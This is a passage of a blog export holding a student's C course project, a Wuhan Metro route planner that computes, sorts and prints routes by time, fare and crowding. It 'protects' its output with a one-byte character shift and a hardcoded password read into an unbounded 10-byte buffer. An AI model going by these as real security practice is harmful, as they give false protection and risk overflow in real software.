&#125;</span><br><span class="line">		k = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;第%d条路径：&quot;</span>, z + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s&quot;</span>, path[print[z]].s[k].name);</span><br><span class="line">			<span class="keyword">if</span>(path[print[z]].s[k+<span class="number">1</span>].line!=<span class="number">0</span>)</span><br><span class="line">				<span class="keyword">if</span> (path[print[z]].s[k].line != path[print[z]].s[k + <span class="number">1</span>].line)</span><br><span class="line">					<span class="built_in">fprintf</span>(fp,<span class="string">&quot;(换乘至%d号线)&quot;</span>, path[print[z]].s[k + <span class="number">1</span>].line);</span><br><span class="line">			<span class="keyword">if</span> (path[print[z]].s[k + <span class="number">1</span>].line != <span class="number">0</span>)</span><br><span class="line">				<span class="built_in">fprintf</span>(fp,<span class="string">&quot;--&gt;&quot;</span>);</span><br><span class="line">			k++;</span><br><span class="line">		&#125; <span class="keyword">while</span> (path[print[z]].s[k].line != <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (path[print[z]].minute == <span class="number">999</span>)</span><br><span class="line">				<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\t\t该条路径当前时间无法使用，超出时间范围！\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">0</span>)</span><br><span class="line">					<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\t\t该条路径用时为：%5.1f分钟&quot;</span>, path[print[z]].minute);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\t\t该条路径用时为：%5.1f分钟&quot;</span>, path[print[z]].Factorminute);</span><br><span class="line">				<span class="built_in">fprintf</span>(fp,<span class="string">&quot;\t\t该条路径费用为：%6.2f元&quot;</span>, path[print[z]].fare);</span><br><span class="line">				<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\n\t\t该条路径换乘次数为：%d次&quot;</span>, path[print[z]].HuanNum);</span><br><span class="line">				<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\t\t该条路径共：%d站&quot;</span>, path[print[z]].Num);</span><br><span class="line">				<span class="built_in">fprintf</span>(fp, <span class="string">&quot;\n\t\t该条路径拥挤程度为：%6.2f\n&quot;</span>, path[print[z]].crowding);</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	Cry();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;路径数据已经加密，内容如下：\n&quot;</span>);</span><br><span class="line">	FILE* fw;</span><br><span class="line">	fw= fopen(<span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Path.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span> ((fgets(p, <span class="number">1024</span>, fw)) != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, p);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fw);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n请输入解密密码：&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (Verification()==<span class="number">1</span>) &#123;</span><br><span class="line">		EnCry();</span><br><span class="line">		FILE* fg;</span><br><span class="line">		fg = fopen(<span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Path.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;解密内容如下：\n&quot;</span>);</span><br><span class="line">		<span class="keyword">char</span> x[<span class="number">1024</span>];</span><br><span class="line">		<span class="keyword">while</span> ((fgets(x, <span class="number">1024</span>, fg)) != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, x);</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fg);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;密码输入错误，无法查看！&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;del Path.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：HandlePath</span></span><br><span class="line"><span class="comment">*函数功能：处理路径的时间，费用，拥挤度等</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HandlePath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">	EdgeNode* p;</span><br><span class="line">	p = (struct EdgeNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct EdgeNode));</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt; pathnumber; k++)<span class="comment">//找出10条路径后，pathnumber的值应该为11</span></span><br><span class="line">	&#123;</span><br><span class="line">		path[k].Num = CountPathNum(k);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; path[k].s[j].line != <span class="number">0</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			p = path[k].s[j].next;</span><br><span class="line">			<span class="keyword">if</span> (path[k].s[j + <span class="number">1</span>].line != <span class="number">0</span>)<span class="comment">//当前站不是终点站</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//先找到连接两个站点的邻接边</span></span><br><span class="line">				<span class="keyword">while</span> (<span class="built_in">strcmp</span>(FindStation(p-&gt;nextline, p-&gt;nextnumber).name, path[k].s[j + <span class="number">1</span>].name))</span><br><span class="line">				&#123;<span class="comment">//找到邻接边后，strcmp返回0，循环退出</span></span><br><span class="line">					p = p-&gt;next;</span><br><span class="line">				&#125;</span><br><span class="line">				path[k].distance += p-&gt;distance;</span><br><span class="line">				<span class="keyword">if</span> (p-&gt;IsTransfer == <span class="number">1</span>)</span><br><span class="line">					path[k].HuanNum++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		path[k].fare = CheckFare(path[k].distance);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//接下来处理路径的加权时间问题，对换乘时要进行特别分析，考虑拥挤度</span></span><br><span class="line">		path[k].minute = QueryPathTime(k, CurrentTime,<span class="number">0</span>);</span><br><span class="line">		path[k].Factorminute = QueryPathTime(k, CurrentTime,<span class="number">1</span>);</span><br><span class="line">		path[k].crowding = path[k].crowding / (CountPathNum(k)<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：QueryPathTime</span></span><br><span class="line"><span class="comment">*函数功能：计算路径所用时间，与当前设置时间有关</span></span><br><span class="line"><span class="comment">*返回类型：double类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">QueryPathTime</span><span class="params">(<span class="keyword">int</span> path_number, <span class="keyword">double</span> time,<span class="keyword">int</span> flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;<span class="comment">//规定如下：拥挤程度&lt;20%，时间系数为0.6；20%-50%，1.0；50%-75%，1.2；75%-100%，1.5；</span></span><br><span class="line"><span class="comment">//总时间=（行车时间+停车时间）*时间系数+换线时间</span></span><br><span class="line"><span class="comment">//每到达一个站点需要考虑该时间点线路的拥挤程度</span></span><br><span class="line"><span class="comment">//设置路线总的拥挤程度=不同时间点拥挤度之和/路线站点数量</span></span><br><span class="line">	<span class="keyword">double</span> Sum_time = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> temp_time;<span class="comment">//车到达的时间</span></span><br><span class="line">	<span class="keyword">double</span> temp_crowding;</span><br><span class="line">	<span class="keyword">int</span> direction;</span><br><span class="line">	EdgeNode* p;</span><br><span class="line">	path[path_number].crowding = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; path[path_number].s[i].line != <span class="number">0</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		p = path[path_number].s[i].next;</span><br><span class="line">		<span class="keyword">if</span> (path[path_number].s[i + <span class="number">1</span>].line != <span class="number">0</span>)<span class="comment">//当前点不是终点</span></span><br><span class="line">		&#123;<span class="comment">//首先确定当前站点是否属于换乘站点（如果属于换乘站点，但仍存储的是原先线路序号，需要找到换乘后的线路号）</span></span><br><span class="line">			<span class="comment">//然后确定当前站点列车到达时间（考虑列车停车的时间）</span></span><br><span class="line">			<span class="keyword">if</span> (path[path_number].s[i].line != path[path_number].s[i + <span class="number">1</span>].line)</span><br><span class="line">			&#123;<span class="comment">//当前站点是换乘站点且接下来会换乘</span></span><br><span class="line">				Sum_time += <span class="number">3.5</span>;</span><br><span class="line">				time += <span class="number">3.5</span>;</span><br><span class="line">				<span class="keyword">while</span> (p-&gt;nextline != path[path_number].s[i + <span class="number">1</span>].line)</span><br><span class="line">					p = p-&gt;next;</span><br><span class="line">				<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(path[path_number].s[i].name, FindStation(p-&gt;nextline, p-&gt;nextnumber + <span class="number">1</span>).name))</span><br><span class="line">					direction = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					direction = <span class="number">0</span>;</span><br><span class="line">			    SetCrowding(p-&gt;nextline, time);</span><br><span class="line">				temp_crowding = line[p-&gt;nextline - <span class="number">1</span>].crowding;</span><br><span class="line">				temp_time = GetStationTime(p-&gt;nextline, p-&gt;nextnumber, direction, time);</span><br><span class="line">				<span class="comment">//主观时间计算</span></span><br><span class="line">				<span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="comment">//不考虑拥挤度</span></span><br><span class="line">				&#123;</span><br><span class="line">					Sum_time += temp_time + <span class="number">1</span> - time + <span class="number">2</span>;<span class="comment">//车离开时间-当前时间+行车时间</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					Sum_time += (temp_time + <span class="number">1</span> - time + <span class="number">2</span>) * TimeFactor(temp_crowding);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;<span class="comment">//不用换乘</span></span><br><span class="line">				<span class="keyword">if</span> (i == <span class="number">0</span>) &#123;<span class="comment">//如果是起点</span></span><br><span class="line">					<span class="keyword">if</span> (path[path_number].s[i].number &lt; path[path_number].s[i + <span class="number">1</span>].number)</span><br><span class="line">						direction = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">						direction = <span class="number">1</span>;</span><br><span class="line">					SetCrowding(path[path_number].s[i].line, time);</span><br><span class="line">					temp_crowding = line[path[path_number].s[i].line - <span class="number">1</span>].crowding;</span><br><span class="line">					temp_time = GetStationTime(path[path_number].s[i].line, path[path_number].s[i].number, direction, time);</span><br><span class="line">					<span class="comment">//主观时间计算</span></span><br><span class="line">					<span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="comment">//不考虑拥挤度</span></span><br><span class="line">					&#123;</span><br><span class="line">						Sum_time += temp_time + <span class="number">1</span> - time + <span class="number">2</span>;<span class="comment">//车离开时间-当前时间+行车时间</span></span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						Sum_time += (temp_time + <span class="number">1</span> - time + <span class="number">2</span>) * TimeFactor(temp_crowding);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;<span class="comment">//不是起点且不换乘，则直接加3</span></span><br><span class="line">					SetCrowding(path[path_number].s[i].line, time);</span><br><span class="line">					temp_crowding = line[path[path_number].s[i].line - <span class="number">1</span>].crowding;</span><br><span class="line">					<span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="comment">//不考虑拥挤度</span></span><br><span class="line">					&#123;</span><br><span class="line">						Sum_time += <span class="number">3</span>;<span class="comment">//车离开时间-当前时间+行车时间</span></span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span> <span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						Sum_time += <span class="number">3</span> * TimeFactor(temp_crowding);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			path[path_number].crowding += temp_crowding;</span><br><span class="line">			<span class="comment">//当前时间变更</span></span><br><span class="line">			time = temp_time + <span class="number">3</span>;</span><br><span class="line">			<span class="keyword">if</span> (temp_time == <span class="number">0</span>)</span><br><span class="line">			&#123;<span class="comment">//当前路径不可达，将时间设置为最大值</span></span><br><span class="line">				path[pathnumber].NotGet = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">999</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Sum_time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：TimeFactor</span></span><br><span class="line"><span class="comment">*函数功能：根据拥挤度算出当前时间系数</span></span><br><span class="line"><span class="comment">*返回类型：double类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">TimeFactor</span><span class="params">(<span class="keyword">double</span> crowding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> factor=<span class="number">1.0</span>;</span><br><span class="line">	<span class="keyword">if</span> (crowding &lt; <span class="number">0.2</span>)</span><br><span class="line">		factor = <span class="number">0.6</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (crowding &lt; <span class="number">0.5</span>)</span><br><span class="line">		factor = <span class="number">1.0</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (crowding &lt; <span class="number">0.75</span>)</span><br><span class="line">		factor = <span class="number">1.2</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (crowding &lt; <span class="number">1.0</span>)</span><br><span class="line">		factor = <span class="number">1.5</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;拥挤度超出限制！&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> factor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：SortPath</span></span><br><span class="line"><span class="comment">*函数功能：根据输入选项对路径排序并将下标存入数组中</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SortPath</span><span class="params">(<span class="keyword">int</span> choice)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">		print[i] = i + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">switch</span> (choice)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		<span class="comment">//按照时间进行排序,不考虑拥挤度</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;<span class="number">10</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (path[print[i]].minute &gt; path[print[j]].minute)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = print[i];</span><br><span class="line">					print[i] = print[j];</span><br><span class="line">					print[j] = temp;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		<span class="comment">//按照时间进行排序，考虑拥挤度</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (path[print[i]].Factorminute &gt; path[print[j]].Factorminute)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = print[i];</span><br><span class="line">					print[i] = print[j];</span><br><span class="line">					print[j] = temp;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		<span class="comment">//按照费用进行排序</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (path[print[i]].fare &gt; path[print[j]].fare)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = print[i];</span><br><span class="line">					print[i] = print[j];</span><br><span class="line">					print[j] = temp;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">		<span class="comment">//按照综合拥挤度进行排序</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (path[print[i]].crowding &gt; path[print[j]].crowding)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = print[i];</span><br><span class="line">					print[i] = print[j];</span><br><span class="line">					print[j] = temp;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">		<span class="comment">//按照换乘次数进行排序</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span> ;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (path[print[i]].HuanNum &gt; path[print[j]].HuanNum)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = print[i];</span><br><span class="line">					print[i] = print[j];</span><br><span class="line">					print[j] = temp;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：SetCrowdRange</span></span><br><span class="line"><span class="comment">*函数功能：根据输入选项对路径拥挤度进行筛选</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetCrowdRange</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入线路综合拥挤度范围：&quot;</span>);</span><br><span class="line">	<span class="keyword">double</span> crowd1, crowd2;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%lf %lf&quot;</span>, &amp;crowd1, &amp;crowd2);</span><br><span class="line">	Log(privacy, crowd1);</span><br><span class="line">	Log(privacy, crowd2);</span><br><span class="line">	SortPath(<span class="number">4</span>);</span><br><span class="line">	<span class="keyword">int</span> temp[<span class="number">3</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">11</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> ((path[i].crowding &lt;= crowd1) || (path[i].crowding &gt;= crowd2))</span><br><span class="line">		&#123;</span><br><span class="line">			temp[j++] = i;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (j &gt;= <span class="number">3</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	print[<span class="number">0</span>] = temp[<span class="number">0</span>];</span><br><span class="line">	print[<span class="number">1</span>] = temp[<span class="number">1</span>];</span><br><span class="line">	print[<span class="number">2</span>] = temp[<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Cry</span></span><br><span class="line"><span class="comment">*函数功能：对文件进行简单的加密</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fp,*fpw;</span><br><span class="line">	<span class="keyword">char</span>* filename = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Path.txt&quot;</span>;</span><br><span class="line">	fp = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span>* filename2 = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Temp.txt&quot;</span>;</span><br><span class="line">	fpw = fopen(filename2, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span> ((fgets(p,<span class="number">1024</span>,fp)!=<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(p); i++)</span><br><span class="line">		&#123;</span><br><span class="line">			p[i] ++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fputs</span>(p, fpw);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(fpw);</span><br><span class="line">	system(<span class="string">&quot;del Path.txt&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rename Temp.txt Path.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：EnCry</span></span><br><span class="line"><span class="comment">*函数功能：对文件进行简单的解密</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnCry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fp, * fpw;</span><br><span class="line">	<span class="keyword">char</span>* filename = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Path.txt&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span>* filename2 = <span class="string">&quot;C:\\Users\\15242\\source\\repos\\Wuhan Metro 2.0\\Temp.txt&quot;</span>;</span><br><span class="line">	fp = fopen(filename, <span class="string">&quot;r+&quot;</span>);</span><br><span class="line">	fpw = fopen(filename2, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> p[<span class="number">1024</span>];</span><br><span class="line">	<span class="keyword">while</span> ((fgets(p, <span class="number">1024</span>, fp)) != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(p); i++)</span><br><span class="line">			p[i] --;</span><br><span class="line">		<span class="built_in">fputs</span>(p, fpw);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	fclose(fpw);</span><br><span class="line">	system(<span class="string">&quot;del Path.txt&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;rename Temp.txt Path.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************</span></span><br><span class="line"><span class="comment">*函数名称：Verification</span></span><br><span class="line"><span class="comment">*函数功能：验证密码是否正确</span></span><br><span class="line"><span class="comment">*返回类型：void类型</span></span><br><span class="line"><span class="comment">****************************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Verification</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> password[<span class="number">10</span>] = <span class="string">&quot;2021&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> pwd[<span class="number">10</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> x;</span><br><span class="line">	<span class="keyword">while</span> ((x = getch()) != <span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (x == <span class="number">8</span>)</span><br><span class="line">		&#123;<span class="comment">//如果是回撤,不录入数组</span></span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			pwd[i++] = x;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(password, pwd))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// ! DEALPATH_H</span></span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>课程设计</category>
        <category>C语言课设</category>
      </categories>
      <tags>
        <tag>课程设计</tag>
      </tags>
  </entry>
</search>
